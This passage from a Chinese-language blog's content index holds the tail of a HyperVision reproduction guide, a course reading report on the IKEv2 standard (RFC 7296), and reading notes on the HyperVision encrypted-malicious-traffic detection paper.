\u0026#34;$HOME/HyperVision\u0026#34;:/root/HyperVision homebrew/ubuntu22.04:latest # 进入 docker exec hypervision -it bash 接下来的操作在docker里了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 sudo su cd /root/HyperVision sudo ./env/install_all.sh # 这里最好先换个国内的源，会把需要装的都装了 wget https://hypervision-publish.s3.cn-north-1.amazonaws.com.cn/hypervision-dataset.tar.gz # 下载数据集，有6G，走的cdn，裸连速度就还不错 tar -xzf hypervision-dataset.tar.gz # 我也不知道为什么他写了个-xxf 如果想删掉原来的就删吧，不删也没关系 ./script/rebuild.sh ./script/expand.sh cd build \u0026amp;\u0026amp; ../script/run_all_brute.sh \u0026amp;\u0026amp; cd .. cd ./result_analyze ./batch_analyzer.py -g brute cat ./log/brute/*.log | grep AU_ROC 在https://www.bilibili.com/video/BV1zj411e7xC/可以看到复现视频\n","date":"2023-10-25T10:25:43+08:00","image":"http://localhost:1313/img/placeholder.jpeg","permalink":"http://localhost:1313/p/%E5%A4%8D%E7%8E%B0detecting-unknown-encrypted-malicious-traffic-in-real-time-via-flow-interaction-graph-analysis/","title":"复现Detecting Unknown Encrypted Malicious Traffic in Real Time via Flow Interaction Graph Analysis"},{"content":"导语 ucas 2023秋 网络认证技术\n作业2：任选一个标准（口令鉴别协议），书写阅读报告。报告内容要求描述基本原理，解决了什么问题，可能存在什么问题。\n概述 我选择阅读RFC 7296，该标准是互联网密钥交换 （IKE） 协议的第二个版本。本标准使RFC 5996废弃， IKEv2是当前的互联网标准。\n解决了什么问题 IKEv2（Internet Key Exchange version 2）是一种用于建立虚拟专用网络（VPN）连接的协议，它解决了许多与安全通信和远程访问有关的问题。包括：\n安全性：IKEv2提供了强大的安全性，通过使用加密算法来保护数据的机密性和完整性。它还允许身份验证，以确保通信双方是合法的，并可以抵御各种网络攻击，如中间人攻击和数据篡改。 移动性：IKEv2支持移动设备的连接，允许用户从一个网络切换到另一个网络时保持连接的连续性。这对于移动工作人员或在不同网络环境中工作的人员非常有用。 多平台兼容性：IKEv2是一种通用的VPN协议，支持多种操作系统和设备，包括Windows、macOS、iOS、Android和Linux。这使得它成为广泛使用的VPN协议，能够在不同平台之间建立安全的连接。 快速重新连接：IKEv2具有快速重新连接的能力，可以在断开连接后快速重新建立连接，而不需要用户手动干预。这对于移动设备或不稳定的网络连接非常有用。 支持IPv6：随着IPv6的推广，IKEv2也提供了对IPv6的良好支持，使其适用于新一代互联网协议。 NAT穿透：IKEv2能够穿越网络地址转换（NAT）设备，这使得它在各种网络环境中都能够正常工作，包括家庭网络和企业网络。 在基本原理-1.1节也简述了IKEv2在特定场景下解决了什么问题。\n基本原理 1.1 使用场景 IP 安全性 （IPsec） 为 IP 数据报提供机密性、数据完整性、访问控制和数据源身份验证，这些服务是通过维护 IP 数据报的源和接收方之间的共享状态来提供的。以手动方式建立此共享状态不能很好地扩展。IKEv2正是这样一个动态建立此状态的协议。IKE 在双方之间执行相互身份验证，并建立 IKE 安全关联 （SA），该关联包含共享机密信息，可用于高效建立用于封装安全有效负载 （ESP） [ESP] 或身份验证标头 （AH） [AH] 的 SA，以及一组加密算法，供 SA 用于保护其承载的流量。IKE 用于在许多不同的场景中协商 ESP 或 AH SA，每种方案都有自己的特殊要求。\n1.1.1 隧道模式下的安全网关到安全网关 在此方案中，IP 连接的两个endpoint都不实现 IPsec，但它们之间的网络节点会保护部分方式的流量。保护对endpoint是透明的，并且依赖于普通路由通过隧道终结点发送数据包进行处理。每个endpoint将宣布其后subnet的地址集，数据包将以隧道模式发送，其中内部 IP 标头将包含实际端点的 IP 地址。\n1.1.2 端点到端点传输模式 在此方案中，IP 连接的两个终结点都实现 IPsec，这是 [IPSECARCH] 中主机的要求。该模式通常使用没有内部 IP 标头。将协商一对地址，以便此 SA 保护数据包。这些endpoint可以根据参与者的 IPsec 身份验证身份实现应用层访问控制。此方案实现了端到端安全性。虽然此场景可能不完全适用于 IPv4 公网，但已在使用 IKEv1 的内网内的特定场景中成功部署。在向 IPv6 过渡期间和采用 IKEv2 期间，应该更广泛地启用它。\n在这种情况下，一个或两个受保护的端点可能位于网络地址转换 （NAT） 节点后面，在这种情况下，必须对隧道数据包进行 UDP 封装，以便 UDP 标头中的端口号可用于标识 NAT “后面”的各个endpoint。\n1.1.3隧道模式下的端点到安全网关 在此方案中，受保护的endpoint（通常是便携式计算机）通过受 IPsec保护的隧道连接回其企业网络。它可能仅使用此隧道访问公司网络上的信息，或者可能通过公司网络将其所有流量通过隧道传输回，以便利用公司防火墙提供的针对基于 Internet 的攻击的保护。在任一情况下，受保护端点都需要一个与安全网关关联的 IP 地址，以便返回到该网关的数据包将转到安全网关并用隧道传回。此 IP 地址可以是静态的，也可以由安全网关动态分配。为了支持后一种情况，IKEv2 包括一种机制（即配置有效负载），发起方请求安全网关拥有的 IP 地址，以便在其 SA 期间使用。\n在这种情况下，数据包将使用隧道模式。在来自受保护endpoint的每个数据包上，外部 IP 标头将包含与其当前位置关联的源 IP 地址（即，将流量直接路由到端点的地址），而内部 IP 标头将包含安全网关分配的源 IP 地址（即，将流量路由到安全网关以转发到端点的地址）。外部目标地址将始终是安全网关的地址，而内部目标地址将是数据包的最终目标。\n在这种情况下，受保护的终结点可能位于 NAT 后面。在这种情况下，安全网关看到的 IP 地址将与受保护端点发送的 IP 地址不同，并且必须对数据包进行 UDP 封装才能正确路由。\n1.2初始交换 使用 IKE 的通信始终从IKE_SA_INIT和IKE_AUTH交换开始（在 IKEv1 中称为阶段 1）。这些初始交换通常由四条消息组成，但在某些情况下，该数字可能会增长。使用 IKE 的所有通信都由请求/响应对组成。我们将首先描述基础交换，然后是变体。第一对消息 （IKE_SA_INIT） 协商加密算法、交换随机数并进行 Diffie-Hellman 交换 [DH]。\n第二对消息 （IKE_AUTH） 对以前的消息进行身份验证，交换身份和证书，并建立第一个子 SA。这些消息的某些部分使用通过IKE_SA_INIT交换建立的密钥进行加密和完整性保护，因此身份对窃听者隐藏，并且所有消息中的所有字段都经过身份验证。有关如何生成加密密钥的信息，请参阅第 2.14 节。（无法完成IKE_AUTH交换的中间人攻击者仍可以看到发起者的身份。\n初始交换后的所有消息都使用在IKE_SA_INIT交换中协商的加密算法和密钥进行加密保护。这些后续消息使用第 3.14 节中描述的加密有效负载的语法，使用第 2.14 节中所述派生的密钥进行加密。所有后续消息都包含加密有效负载，即使它们在文本中称为“空”。对于CREATE_CHILD_SA、IKE_AUTH或信息交换，标头后面的消息是加密的，包含标头的消息是使用为 IKE SA 协商的加密算法进行完整性保护的。\n每个 IKE 消息都包含一个消息 ID 作为其固定标头的一部分。此消息 ID 用于匹配请求和响应，并标识消息的重新传输。\n一些简称如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 Notation Payload ---------------------------------------- AUTH Authentication CERT Certificate CERTREQ Certificate Request CP Configuration D Delete EAP Extensible Authentication HDR IKE header (not a payload) IDi Identification - Initiator IDr Identification - Responder KE Key Exchange Ni, Nr Nonce N Notify SA Security Association SK Encrypted and Authenticated TSi Traffic Selector - Initiator TSr Traffic Selector - Responder V Vendor ID 第 3 节介绍了每个有效负载的内容的详细信息。可能选择显示的有效负载将显示在括号中，例如 [CERTREQ];这表示可以选择包含证书请求有效负载。\n初始交流如下：\n发起方→接收方HDR, SAi1, KEi, Ni。\nHDR 包含安全参数索引 （SPI）、版本号、Exchange 类型、消息 ID 和各种标志。SAi1 有效负载声明发起方为 IKE SA 支持的加密算法。KE 有效负载发送发起方的 Diffie-Hellman 值。Ni是发起者的随机数。\n接收方→发起方HDR, SAr1, KEr, Nr, [CERTREQ]。\n响应方从发起方提供的选择中选择加密套件，并在 SAr1 有效负载中表达该选择，完成与 KEr 有效负载的 Diffie-Hellman 交换，并在 Nr 有效负载中发送其随机数。\n在协商的这一点上，每一方都可以生成一个名为 SKEYSEED 的数量（参见第 2.14 节），该 IKE SA 的所有密钥都从中派生出来。以下消息完全加密和完整性保护，邮件头除外。用于加密和完整性保护的密钥派生自 SKEYSEED，称为SK_e（加密）和SK_a（身份验证，又名完整性保护）;有关密钥派生的详细信息，请参见第 2.13 和 2.14 节。为每个方向计算单独的SK_e和SK_a。除了从 Diffie-Hellman 值派生的用于保护 IKE SA 的密钥SK_e和SK_a之外，还派生了另一个数量SK_d，并用于派生子 SA 的进一步密钥材料。符号 SK { \u0026hellip; } 表示这些有效负载已使用该方向的SK_e和SK_a进行加密和完整性保护。\n发起方→接收方HDR, SK {IDi, [CERT,] [CERTREQ,] [IDr,] AUTH, SAi2, TSi, TSr} 。发起方使用 IDi 有效负载断言其身份，证明与 IDi 对应的密钥的知识，完整性使用 AUTH 有效负载保护第一条消息的内容（请参阅第 2.15 节）。它还可能在 CERT 有效负载中发送其证书，并在 CERTREQ 有效负载中发送其信任锚的列表。如果包含任何 CERT 有效负载，则提供的第一个证书必须包含用于验证 AUTH 字段的公钥。可选的有效负载 IDr 使发起方能够指定要与响应方的哪个身份通信。当运行响应程序的计算机在同一 IP 地址上托管多个标识时，这很有用。如果发起方建议的 IDr 不被响应方接受，则响应方可能会使用其他某个 IDr 来完成交换。如果发起方随后不接受响应方使用的 IDr 与所请求的 IDr 不同的事实，则发起方可以在注意到这一事实后关闭 SA。发起方使用 SAi2 有效负载开始协商子 SA。最终字段（以 SAi2 开头）在CREATE_CHILD_SA交换的描述中描述。\n接收方→发起方HDR, SK {IDr, [CERT,] AUTH, SAr2, TSi, TSr}。响应方使用 IDr 有效负载断言其身份，可以选择发送一个或多个证书（再次使用包含用于验证 AUTH 的公钥的证书首先列出），使用 AUTH 有效负载验证其身份并保护第二条消息的完整性，并使用下面在CREATE_CHILD_SA交换中描述的其他字段完成子 SA 的协商。IKE_AUTH交换双方必须验证所有签名和消息身份验证代码 （MAC） 是否正确计算。如果任何一方使用共享密钥进行身份验证，则 ID 有效负载中的名称必须与用于生成 AUTH 有效负载的密钥相对应。由于发起方在IKE_SA_INIT中发送其 Diffie-Hellman 值，因此它必须猜测响应方将从其支持的组列表中选择的 Diffie-Hellman 组。如果发起方猜错了，响应方将使用类型 INVALID_KE_PAYLOAD 的通知有效负载进行响应，指示所选组。在这种情况下，发起方必须使用更正的 Diffie-Hellman 组重试IKE_SA_INIT。发起方必须再次提出其完整的可接受加密套件集，因为拒绝消息未经身份验证，否则主动攻击者可以诱使端点协商弱的套件。\n如果在IKE_AUTH交换期间创建子 SA 由于某种原因而失败，IKE SA 仍会照常创建。IKE_AUTH交换中不阻止设置 IKE SA 的通知消息类型列表至少包括以下内容：NO_PROPOSAL_CHOSEN、TS_UNACCEPTABLE、SINGLE_PAIR_REQUIRED、INTERNAL_ADDRESS_FAILURE和FAILED_CP_REQUIRED。\n如果失败与创建 IKE SA 有关（例如，返回AUTHENTICATION_FAILED通知错误消息），则不会创建 IKE SA。请注意，尽管IKE_AUTH消息已加密且完整性受到保护，但如果收到此通知错误消息的对等方尚未对另一端进行身份验证（或者如果对等方由于某种原因未能对另一端进行身份验证），则需要谨慎对待这些信息。更准确地说，假设MAC正确验证，则已知错误通知消息的发送方是IKE_SA_INIT交换的响应者，但无法保证发送方的身份。\n请注意，IKE_AUTH消息不包含 KEi/KEr 或 Ni/Nr 有效负载。因此，IKE_AUTH交换中的 SA 有效负载不能包含具有除 NONE 以外的任何值的转换类型 4（Diffie-Hellman 组）。实现应该省略整个转换子结构，而不是发送值 NONE。\n1.3 CREATE_CHILD_SA交换 CREATE_CHILD_SA交换用于创建新的子 SA，并重新生成 IKE SA 和子 SA 的密钥。此交换由单个请求/响应对组成，其某些功能在 IKEv1 中称为第 2 阶段交换。在初始交换完成后，它可以由IKE SA的任何一端发起。\n通过创建新 SA，然后删除旧 SA 来重新生成 SA 的密钥。本节介绍重新生成密钥的第一部分，即创建新 SA;第 2.8 节介绍了重新生成密钥的机制，包括将流量从旧 SA 移动到新 SA 以及删除旧 SA。必须一起阅读这两个部分才能理解重新生成密钥的整个过程。\n任一端点都可能发起CREATE_CHILD_SA交换，因此在本节中，术语发起方是指发起此交换的端点。实现可以拒绝 IKE SA 中的所有CREATE_CHILD_SA请求。\nCREATE_CHILD_SA请求可以选择包含用于额外 Diffie-Hellman 交换的 KE 有效负载，以便为子 SA 提供更强有力的前向保密保证。子 SA 的键控材料是 IKE SA 建立期间建立的SK_d、CREATE_CHILD_SA交换期间交换的随机数和 Diffie-Hellman 值（如果 KE 有效载荷包含在CREATE_CHILD_SA交换中）的函数。\n如果CREATE_CHILD_SA交换包含 KEi 有效载荷，则至少有一个 SA 报价必须包括 KEi 的 Diffie-Hellman 组。KEi的Diffie-Hellman组必须是发起者期望响应者接受的组的一个元素（可以提出其他Diffie-Hellman组）。如果响应方使用不同的 Diffie-Hellman 组（NONE 除外）选择提案，则响应方必须拒绝该请求，并在INVALID_KE_PAYLOAD Notify 有效负载中指示其首选的 Diffie-Hellman 组。有两个八位字节的数据与此通知相关联：接受的 Diffie-Hellman 组号，按大端序排列。在此类拒绝的情况下，CREATE_CHILD_SA交换失败，发起方可能会在响应者在INVALID_KE_PAYLOAD通知有效负载中给出的组中使用 Diffie-Hellman 提案和 KEi 重试交换。\n响应方发送NO_ADDITIONAL_SAS通知，以指示CREATE_CHILD_SA请求不可接受，因为响应方不愿意在此 IKE SA 上接受更多的子 SA。此通知还可用于拒绝 IKE SA 重新生成密钥。一些最小实现可能只接受初始 IKE 交换上下文中的单个子 SA 设置，并拒绝任何后续添加更多设置的尝试。\n1.3.1 通过CREATE_CHILD_SA交换创建新的子 SA 可以通过发送CREATE_CHILD_SA请求来创建子 SA。创建新子 SA 的CREATE_CHILD_SA请求是：\n发起方→接收方 HDR, SK {SA, Ni, [KEi,] TSi, TSr}。\n发起方在 SA 有效负载中发送 SA 选件，在 Ni 有效负载中发送随机数，在 KEi 有效负载中发送 Diffie-Hellman 值（可选），并在 TSi 和 TSr 有效负载中发送建议的子 SA 的建议流量选择器。\n接收方→发起方 HDR, SK {SA, Nr, [KEr,]TSi, TSr}\n如果请求中包含 KEi 并且所选加密套件包含该组，则响应程序使用 SA 有效负载中的已接受产品/服务、Nr 有效负载中的随机数和 KEr 有效负载中的 Diffie-Hellman 值进行回复（使用相同的消息 ID 进行响应）。\n要在该 SA 上发送的流量的流量选择器在响应的 TS 有效负载中指定，这可能是子 SA 的发起方建议的子集。\nUSE_TRANSPORT_MODE通知可以包含在请求消息中，该消息还包括请求子 SA 的 SA 有效负载。它要求子 SA 对创建的 SA 使用传输模式而不是隧道模式。如果请求被接受，则响应还必须包含类型 USE_TRANSPORT_MODE 的通知。如果响应方拒绝请求，子 SA 将在隧道模式下建立。如果发起方无法接受，则发起方必须删除 SA。注意：除非使用此选项协商传输模式，否则所有子 SA 都将使用隧道模式。\nESP_TFC_PADDING_NOT_SUPPORTED通知断言发送终结点将不接受在正在协商的子 SA 上填充包含流量流机密性 （TFC） 填充的数据包。如果两个终结点都不接受 TFC 填充，则此通知将包含在请求和响应中。如果此通知仅包含在其中一条消息中，则仍可以在另一个方向发送 TFC 填充。\nNON_FIRST_FRAGMENTS_ALSO通知用于碎片控制。有关更全面的解释，请参见 [IPSECARCH]。双方需要同意在任何一方发送非第一个片段之前发送。仅当建议 SA 的请求和接受 SA 的响应中都包含通知NON_FIRST_FRAGMENTS_ALSO才会启用它。如果响应程序不想发送或接收非第一个片段，则它只会从响应中省略NON_FIRST_FRAGMENTS_ALSO通知，但不会拒绝整个子 SA 创建。\n第 2.22 节中涵盖的IPCOMP_SUPPORTED通知也可以包含在交易所中。\n创建子 SA 的失败尝试不应拆除 IKE SA：没有理由丢失为 IKE SA 所做的工作。有关创建子 SA 失败时可能出现的错误消息列表，请参阅第 2.21 节。\n1.3.2 使用CREATE_CHILD_SA交换机重新生成 IKE SA 的密钥 重新生成 IKE SA 密钥的CREATE_CHILD_SA请求是：\n发起方→接收方HDR, SK {SA, Ni, KEi}\n发起方在 SA 有效负载中发送 SA 产品/服务，在 Ni 有效负载中发送随机数，在 KEi 有效负载中发送 Diffie-Hellman 值。必须包括 KEi 有效负载。新的发起方 SPI 在 SA 有效负载的 SPI 字段中提供。一旦对等方收到重新生成 IKE SA 密钥的请求或发送重新生成 IKE SA 的请求，它就不应在正在重新生成密钥的 IKE SA 上发起任何新的CREATE_CHILD_SA交换。\n接收方→发起方 HDR, SK {SA, Nr, KEr}\n如果所选加密套件包含该组，则响应程序使用 SA 有效负载中的已接受产品/服务、Nr 有效负载中的随机数和 KEr 有效负载中的 Diffie-Hellman 值进行回复（使用相同的消息 ID 进行响应）。新的响应程序 SPI 在 SA 有效负载的 SPI 字段中提供。\n新的 IKE SA 将其消息计数器设置为 0，无论它们在早期的 IKE SA 中是什么。来自新 IKE SA 上双方的第一个 IKE 请求的消息 ID 为 0。旧的 IKE SA 保留其编号，因此任何进一步的请求（例如，删除 IKE SA）都将具有连续编号。新的 IKE SA 的窗口大小也重置为 1，并且此重新密钥交换中的发起方是新 IKE SA 的新“原始发起方”。\n1.3.3. 使用 CREATE_CHILD_SA 交换重新生成子 SA 的密钥 重新生成子 SA 密钥CREATE_CHILD_SA请求是：\n发起方→接收方 HDR, SK {N(REKEY_SA), SA, Ni, [KEi,] TSi, TSr}\n发起方在 SA 有效负载中发送 SA 选件，在 Ni 有效负载中发送随机数，在 KEi 有效负载中发送 Diffie-Hellman 值（可选），并在 TSi 和 TSr 有效负载中发送建议的子 SA 的建议流量选择器。第 1.3.1 节中描述的通知也可以在重新生成密钥交换中发送。通常，这些通知与原始交换中使用的通知相同;例如，重新生成传输模式 SA 的密钥时，将使用USE_TRANSPORT_MODE通知。如果交换的目的是替换现有的 ESP 或 AH SA，则必须将REKEY_SA通知包含在CREATE_CHILD_SA交换中。正在重新生成密钥的 SA 由通知有效负载中的 SPI 字段标识;这是交换发起方在入站 ESP 或 AH 数据包中期望的 SPI。没有与此通知消息类型关联的数据。REKEY_SA通知的协议 ID 字段设置为与我们要重新生成密钥的 SA 的协议匹配，例如，3 表示 ESP，2 表示 AH。\n重新生成子 SA 密钥CREATE_CHILD_SA响应为：\n接收方→发起方 HDR, SK {SA, Nr, [KEr,] TSi, TSr}\n如果请求中包含 KEi 并且所选加密套件包含该组，则响应程序使用 SA 有效负载中的已接受报价、Nr 有效负载中的随机数和 KEr 有效负载中的 Diffie-Hellman 值进行回复（使用相同的消息 ID 进行响应）。\n要在该 SA 上发送的流量的流量选择器在响应的 TS 有效负载中指定，这可能是子 SA 的发起方建议的子集。\n1.4. 信息交换 在 IKE SA 运行过程中的不同点，对等方可能希望相互传达有关某些事件的错误或通知的控制消息。为了实现这一点，IKE 定义了一个信息交换。信息交换必须仅在初始交换之后进行，并使用协商密钥进行加密保护。请注意，某些信息性消息（而非交换）可以在 IKE SA 的上下文之外发送。第 2.21 节还详细介绍了错误消息。\n与 IKE SA 相关的控制消息必须在该 IKE SA 下发送。与子 SA 相关的控制消息必须在生成它们的 IKE SA（如果 IKE SA 已重新生成密钥，则为其后续消息）的保护下发送。\n信息交换中的消息包含零个或多个通知、删除和配置有效负载。信息交换请求的接收者必须发送一些响应;否则，发送方将假定消息在网络中丢失并重新传输。该响应可能是一条空消息。信息交换中的请求消息也可能不包含有效负载。这是终结点可以要求另一个终结点验证其是否处于活动状态的预期方式。\n信息交换定义为：\n发起方→接收方 HDR, SK {[N,] [D,] [CP,] \u0026hellip;}\n接收方→发起方 HDR, SK {[N,] [D,] [CP,] \u0026hellip;}\n信息交换的处理由其组件有效载荷决定。\n1.4.1. 删除具有信息交换的 SA ESP 和 AH SA 始终成对存在，每个方向上有一个 SA。关闭 SA 时，必须关闭（即删除）对的两个成员。每个终结点必须关闭其传入的 SA，并允许另一个终结点关闭每对中的另一个 SA。要删除 SA，将发送具有一个或多个 Delete 有效负载的信息交换，列出要删除的 SA 的 SPI（正如入站数据包标头中预期的那样）。收件人必须关闭指定的 SA。请注意，从不在单个消息中发送 SA 两端的删除有效负载。如果要同时删除多个 SA，则在信息交换中包括每个 SA 对的入站部分的删除有效负载。\n通常，信息交换中的响应将包含向另一个方向的配对 SA 的删除有效负载。有一个例外。如果一组 SA 的两端偶然独立决定关闭它们，则每个 SA 都可能发送 Delete 有效负载，并且这两个请求可能会在网络中交叉。如果节点收到已发出删除请求的 SA 的删除请求，则必须在处理请求时删除传出 SA，在处理响应时删除传入 SA。在这种情况下，响应不得包含已删除 SA 的删除有效负载，因为这会导致重复删除，并且理论上可能会删除错误的 SA。\n与 ESP 和 AH SA 类似，IKE SA 也通过发送信息交换来删除。删除 IKE SA 会隐式关闭根据该 IKE SA 协商的任何剩余子 SA。对删除 IKE SA 的请求的响应是空的信息响应。\n半闭合 ESP 或 AH 连接是异常的，具有审计功能的节点如果它们仍然存在，则可能应该审计它们的存在。请注意，此规范未指定时间段，因此由各个终结点决定等待多长时间。节点可以拒绝接受半闭合连接上的传入数据，但不得单方面关闭它们并重用 SPI。如果连接状态变得足够混乱，节点可能会关闭 IKE SA，如上所述。然后，它可以在新的 IKE SA 下干净的基础上重建所需的 SA。\n1.5 IKE SA 之外的信息性消息 在某些情况下，节点收到无法处理的数据包，但它可能希望将这种情况通知发送方。\n如果 ESP 或 AH 数据包到达时带有无法识别的 SPI。这可能是由于接收节点最近崩溃并丢失状态，或者由于其他一些系统故障或攻击。 如果加密的 IKE 请求数据包到达端口 500 或 4500，并且具有无法识别的 IKE SPI。这可能是由于接收节点最近崩溃并丢失状态，或者由于其他一些系统故障或攻击。 如果 IKE 请求数据包到达时的主版本号高于实现支持的版本号。 在第一种情况下，如果接收节点有一个活动的 IKE SA 到数据包来自的 IP 地址，它可能会在信息交换中通过该 IKE SA 发送任性数据包的INVALID_SPI通知。通知数据包含无效数据包的 SPI。此通知的接收者无法判断 SPI 是针对 AH 还是 ESP，但这并不重要，因为在许多情况下，两者的 SPI 会有所不同。如果不存在合适的 IKE SA，则节点可能会向源 IP 地址发送没有加密保护的信息性消息，如果数据包是 UDP（UDP 封装的 ESP 或 AH），则使用源 UDP 端口作为目标端口。在这种情况下，它应该只被收件人用作可能出错的提示（因为它很容易被伪造）。此消息不是信息交换的一部分，接收节点不得响应它，因为这样做可能会导致消息循环。消息构造如下：没有对此类通知的接收者有意义的 IKE SPI 值;使用零值或随机值都是可以接受的，这是第 3.1 节中禁止零 IKE 发起方 SPI 的规则的例外。发起方标志设置为 1，响应标志设置为 0，版本标志以正常方式设置;这些标志在第 3.1 节中描述。\n在第两种和第三种情况下，消息始终在没有加密保护的情况下发送（在 IKE SA 外部），并且包括INVALID_IKE_SPI或INVALID_MAJOR_VERSION通知（没有通知数据）。该消息是响应消息，因此它被发送到带有相同 IKE SPI 的 IP 地址和端口，并且消息 ID 和交换类型是从请求中复制的。响应标志设置为 1，版本标志以正常方式设置。\n可能存在的问题 参考发表在27th USENIX Security Symposium (USENIX Security 18), 2018的The Dangers of Key Reuse: Practical Attacks on IPsec IKE可IKEv1、v2如果重用密钥可能导致跨协议身份验证绕过，从而使攻击者能够冒充受害者主机或网络。在IKEv1模式下利用Bleichenbacher预言机，其中RSA加密的随机数用于身份验证。利用此漏洞打破了基于 RSA 加密的模式，此外还破坏了 IKEv1 和 IKEv2 中基于 RSA 签名的身份验证。此外，还存在针对基于 PSK（预共享密钥）的 IKE 模式的离线字典攻击，从而涵盖了 IKE 的所有可用身份验证机制。在思科（CVE-2018-0131）、华为（CVE2017-17305）、Clavister（CVE-2018-8753）和合勤科技（CVE-2018-9129）的IKEv1实现中找到了Bleichenbacher预言机。\n","date":"2023-10-19T16:31:55+08:00","image":"http://localhost:1313/img/placeholder.jpeg","permalink":"http://localhost:1313/p/ikev2%E6%A0%87%E5%87%86%E9%98%85%E8%AF%BB/","title":"IKEv2标准阅读"},{"content":"导语 doi is here\nAbstract 问题引入 目前互联网上的流量已被广泛加密，同时流量加密总是被攻击者滥用以隐藏其恶意行为，现有的加密恶意流量检测方法受到监督，它们依赖于已知攻击（例如，标记数据集）的先验知识。\n提出方法 提出了HyperVision，一种基于实时无监督机器学习的恶意流量检测系统。\n能够利用基于流量模式构建的紧凑内存图来检测加密恶意流量的未知模式。该图捕获由图结构特征表示的流交互模式，而不是特定已知攻击的特征。 我们开发了一种无监督图学习方法，通过分析图的连接性、稀疏性和统计特征来检测异常交互模式 建立了一个信息论模型来证明图保存的信息接近理想的理论边界。 Introduction 现有方法 深度数据包检测（DPI）的传统基于签名的方法在加密有效载荷的攻击下无效，加密流量具有与良性流量相似的特征，因此也可以逃避现有的基于机器学习。特别是，现有的加密流量检测方法受到监督，即依赖于已知攻击的先验知识，并且只能检测具有已知流量模式的攻击。此外，这些方法无法检测使用和不使用加密流量构建的攻击，并且由于加密和非加密攻击流量的特征显着不同，因此无法实现通用检测\n简而言之，现有方法无法实现无监督检测，也无法检测具有未知模式的加密恶意流量。特别是，加密的恶意流量具有隐蔽行为，这些方法无法捕获这些行为，这些方法根据单个流的模式检测攻击。但是，检测此类攻击流量仍然是可行的，因为即使攻击的单个流与良性攻击流相似，这些攻击涉及攻击者和受害者之间具有不同流交互的多个攻击步骤与良性流交互模式不同。\nHyperVision，这是一个实时检测系统，旨在通过分析流之间的交互模式来捕获加密恶意流量的足迹。特别是，它可以通过识别异常流交互（即不同于良性的交互模式）来检测具有未知足迹的加密恶意流。\n但是，构建用于实时检测的图形具有挑战性。我们不能简单地使用 IP 地址作为顶点，而传统的四元组流（源目的ip，源目的port）作为边来构建图，因为生成的密集图无法维持各种流之间的交互模式，例如，引起依赖爆炸问题 。\n收到流量尺寸分布的研究的启发，互联网上的大多数流都是短流，而大多数数据包与长流相关联，我们利用两种策略来记录不同大小的流，并在图中分别处理短流和长流的交互模式。\n我们设计了一种四步 轻量级 无监督 图学习方法，通过利用图上维护的丰富流交互信息来检测加密的恶意流量。\n首先，我们通过提取连通分量来分析图的连通性，并通过对高层次统计特征进行聚类来识别异常分量。通过排除良性分量，我们还显著减少了学习开销。 其次，我们根据在边特征中观察到的局部邻接关系对边进行预聚类。预聚类操作显著降低了特征处理开销，并确保了实时检测。 第三，我们使用Z3 SMT solver求解顶点覆盖问题来提取关键顶点，以最大程度地减少聚类的数量。 最后，根据每个临界顶点的连接边进行聚类，这些边位于预聚类产生的簇的中心，从而得到指示加密恶意流量的异常边。 此外，为了量化HyperVision基于图的流量记录相对于现有方法的优势，我们开发了一个流量记录熵模型，这是一个基于信息论的框架，从理论上分析恶意流量检测系统的现有数据源保留的信息量。这个框架表明NetFlow [19]和Zeek [86]无法保留高保真流量信息，而HyperVision中的图捕获了接近最优的流量信息，并且图中维护的信息量接近理想化数据源的理论上界。（这么屌啊？）此外，分析结果表明，HyperVision中的图形实现了比所有现有数据源更高的信息密度（即每单位存储的流量信息量），这是准确高效检测的基础。\n过两天读R. Zamir, “A proof of the fisher information inequality via a data processing argument,” IEEE Trans. Inf. Theory, vol. 44, no. 3, pp. 12461250, 1998.\n平台和数据集 我们使用英特尔的数据平面开发套件 （DPDK） [37] 对 HyperVision进行原型设计。为了广泛评估原型的性能，我们重放了92个攻击数据集，其中包括在我们的虚拟私有云 （VPC）中收集的80个新数据集，其中包含 1,500 多个实例。在 VPC 中，我们收集了 48 个典型的加密恶意流量，包括 （i） 加密泛洪流量，例如泛洪目标链路 [41];（ii） 网络攻击，例如利用网络漏洞 [64];（iii） 恶意软件活动，包括连接测试、依赖项更新和下载。\n此外，HyperVision 的平均检测吞吐量超过 100 Gb/s，平均检测延迟为 0.83 秒。\n省流 • 我们提出了 HyperVision，这是首个使用流交互图实现对未知模式的加密恶意流量进行实时无监督检测的方法。 • 我们开发了多种算法来构建内存中的图，使我们能够准确捕获不同流之间的交互模式。 • 我们设计了一种轻量级的无监督图形学习方法，通过图形特征来检测加密流量。 • 我们开发了一个由信息论建立的理论分析框架，以展示该图形捕获了接近最优的流量交互信息。 • 我们原型化了 HyperVision，并进行了广泛的实验，使用各种真实世界的加密恶意流量来验证其准确性和效率。\n名词解释 连通分量：在图论中，连通分量是一个图中的一个子图，其中任意两个顶点都可以通过边相连的路径相互访问。\nZ3 SMT solver：3（Z3 SMT solver）是由微软研究院开发的一个高性能的SMT（Satisfiability Modulo Theories）求解器。SMT 求解器是一种自动化工具，用于解决布尔公式、一阶逻辑公式和其他数学理论的判定问题。Z3 在各种计算机科学和工程领域都有广泛的应用，包括软件验证、形式化方法、人工智能、编译器优化和硬件验证等。\n英特尔的数据平面开发套件 （DPDK）：旨在优化数据包处理性能。它专注于高性能网络应用程序和数据平面开发，使开发人员能够在通用服务器硬件上实现高吞吐量和低延迟的数据包处理。它通过绕过操作系统内核，并在用户空间中实现网络协议栈，从而提供极低的延迟和高吞吐量。支持多核处理器，允许并行处理大量数据包。利用支持硬件加速的网络接口卡（NIC）来进一步提高性能。DPDK 是一个开源项目，开发人员可以根据其需求进行自定义和扩展。DPDK 通常用于构建高性能网络应用程序，如网络功能虚拟化（NFV）、防火墙、负载均衡、数据包过滤和路由等。它还用于云计算、边缘计算和网络设备。\nHyperVision 首先HyperVision以镜像来的路由器流量作为输入，确保不会干扰流量转发。在识别加密的恶意流量后，它可以与现有的中间恶意流量防御配合，以限制检测到的流量。重点检测使用加密流量构建的主动攻击。不考虑不会为受害者带来流量的被动攻击，例如流量窃听和被动流量分析\nHyperVision的设计目标如下：首先，它应该能够实现通用检测，即检测使用加密或非加密流量构建的攻击，从而确保攻击无法逃避流量加密的检测。其次，它能够实现实时高速流量处理，这意味着它可以识别通过加密流量是否是恶意的，同时产生低检测延迟。第三，HyperVision 执行的检测是不受监督的，这意味着它不需要任何加密恶意流量的先验知识。\n图构造 